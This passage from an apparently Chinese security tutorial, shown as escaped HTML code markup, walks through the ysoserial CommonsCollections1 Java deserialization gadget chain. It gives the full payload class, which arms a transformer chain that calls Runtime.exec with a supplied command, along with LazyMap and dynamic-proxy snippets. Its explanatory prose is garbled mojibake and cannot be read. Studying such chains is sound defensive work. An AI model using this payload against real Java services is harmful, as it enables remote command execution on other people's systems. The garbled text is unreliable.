&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> AnnotationInvocationHandler.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> ConstantTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Class.getMethod()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.getRuntime()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Requires:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> commons-collections
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@PayloadTest&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">precondition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;isApplicableJavaVersion&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Dependencies&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;commons-collections:commons-collections:3.1&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Authors&lt;/span>&lt;span style="color:#f92672">({&lt;/span> &lt;span style="color:#111">Authors&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FROHOFF&lt;/span> &lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsCollections1&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">PayloadRunner&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectPayload&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#75af00">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">execArgs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">command&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// inert chain for setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// real chain for after setup
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">}),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span> &lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">execArgs&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">lazyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">mapProxy&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoitizedProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lazyMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Gadgets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createMemoizedInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mapProxy&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// arm with actual transformer chain
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">CommonsCollections1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isApplicableJavaVersion&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">JavaVersion&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnInvHUniversalMethodImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ysoserialç”¨çš„æ˜¯ä¸TransformedMapç±»ä¼¼çš„LazyMapï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºTransformedMapæ˜¯åœ¨æ‰§è¡Œputæ“ä½œæ—¶å›è°ƒtransformï¼Œè€ŒLazyMapæ˜¯åœ¨getæ–¹æ³•ä¸­æ‰§è¡Œçš„factory.transformï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼æ‰ä¼šè°ƒç”¨factory.transformå»è·å–ä¸€ä¸ªå€¼ï¼ˆæ‰€è°“Lazy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>LazyMapçš„åˆ©ç”¨æ¯”TransformedMapå¤æ‚ï¼Œå› ä¸ºAnnotationInvocationHandlerè¦†å†™çš„readObjectä¸­å¹¶æ²¡æœ‰ç›´æ¥ä½¿ç”¨Mapçš„getï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©é€šè¿‡javaå¯¹è±¡ä»£ç†çš„æŠ€æœ¯æ¥è§¦å‘å®ƒçš„invoke è¿›è€Œåˆ°get&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“å¯¹è±¡ä»£ç†å¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ª&lt;code>interface&lt;/code>çš„å®ä¾‹ï¼Œå¯ä»¥ç¼–å†™&lt;code>InvocationHandler&lt;/code>æ¥å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨ï¼Œå¯ä»¥åšåˆ°åŠ å·¥å’Œè¦†å†™ï¼ˆä¹Ÿæ­£æ˜¯å«åšProxyçš„åŸå›  å¯¹æ¥å£è¿›è¡ŒProxy çœå»ä¸­é—´ç±»ï¼‰ï¼Œç±»ä¼¼PHPé­”æœ¯æ–¹æ³•ä¸­çš„&lt;code>__call&lt;/code> å¯ä»¥åŠ«æŒå¯¹è±¡å†…éƒ¨çš„æ–¹æ³•è°ƒç”¨ï¼Œç”¨åˆ°java.reflect.Proxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¬¬ä¸€ä¸ªå‚æ•°ClassLoaderæˆ‘ä»¬ä½¿ç”¨é»˜è®¤çš„å³å¯ï¼Œç¬¬äºŒä¸ªæ˜¯æˆ‘ä»¬éœ€è¦ä»£ç†çš„å¯¹è±¡é›†åˆï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå®ç°äº†InvocationHandleræ¥å£çš„å¯¹è±¡ï¼Œé‡Œé¢åŒ…å«äº†å…·ä½“çš„ä»£ç†é€»è¾‘&lt;/p>
&lt;p>æ¯”å¦‚ä¸€ä¸ªè¦†å†™äº†invokeæ–¹æ³•çš„ExampleInvocationHandlerç±»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">compareTo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hookmethod: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hacked Object&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
